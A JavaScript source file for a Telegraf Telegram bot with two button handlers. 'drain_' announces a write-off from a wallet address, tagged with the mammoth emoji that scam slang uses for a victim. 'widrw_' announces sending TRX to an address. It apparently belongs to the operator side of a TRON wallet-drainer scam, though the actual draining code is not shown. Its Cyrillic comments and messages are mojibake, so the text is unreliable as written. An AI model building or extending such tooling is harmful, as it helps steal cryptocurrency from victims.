import { keyboard } from "telegraf/markup";
import { loggerBot } from "../../lib/logger";
import { bot } from "../bot";

async function keyboardDelete(ctx) {
  try {
    const keyboard =
      ctx.update.callback_query?.message?.reply_markup?.inline_keyboard;

    if (keyboard) {
      // –£–¥–∞–ª—è–µ–º —Ç–æ–ª—å–∫–æ –∫–Ω–æ–ø–∫—É —Å callback_data === —Ç–µ–∫—É—â–µ–π
      const newKeyboard = keyboard
        .map((row) =>
          row.filter(
            (button) => button.callback_data !== ctx.callbackQuery?.data
          )
        )
        .filter((row) => row.length > 0); // —É–¥–∞–ª—è–µ–º –ø—É—Å—Ç—ã–µ —Å—Ç—Ä–æ–∫–∏

      // –û–±–Ω–æ–≤–ª—è–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
      await ctx.editMessageReplyMarkup({
        inline_keyboard: newKeyboard,
      });
    }
  } catch (err) {
    loggerBot.error(`–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∫–Ω–æ–∫–∏: ${err}`);
    throw err;
  }
}

bot.action(/^drain_(.+)$/, async (ctx) => {
  const userId = ctx.from?.id;
  const address = ctx.match[1]; // –í—ã—Ç–∞—Å–∫–∏–≤–∞–µ–º –∞–¥—Ä–µ—Å –∏–∑ callback_data
  await ctx.answerCbQuery(); // –£–±–∏—Ä–∞–µ–º "—á–∞—Å–∏–∫–∏"
  await ctx.reply(`[${userId}] ü¶£ –í—ã–ø–æ–ª–Ω—è–µ—Ç c–ø–∏—Å–∞–Ω–∏–µ —Å –∞–¥—Ä–µ—Å–∞: ${address}...`);
  await keyboardDelete(ctx);
});

bot.action(/^widrw_(.+)_(\d+(?:\.\d+)?)$/, async (ctx) => {
  const userId = ctx.from?.id;
  const address = ctx.match[1];
  const amount = parseFloat(ctx.match[2]);
  const amountParse = Number(amount / 1e6).toFixed(2);
  await ctx.answerCbQuery();
  await ctx.reply(
    `[${userId}] üì§ –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç ${amountParse} TRX –Ω–∞ –∞–¥—Ä–µ—Å ${address}...`
  );
  await keyboardDelete(ctx);
});
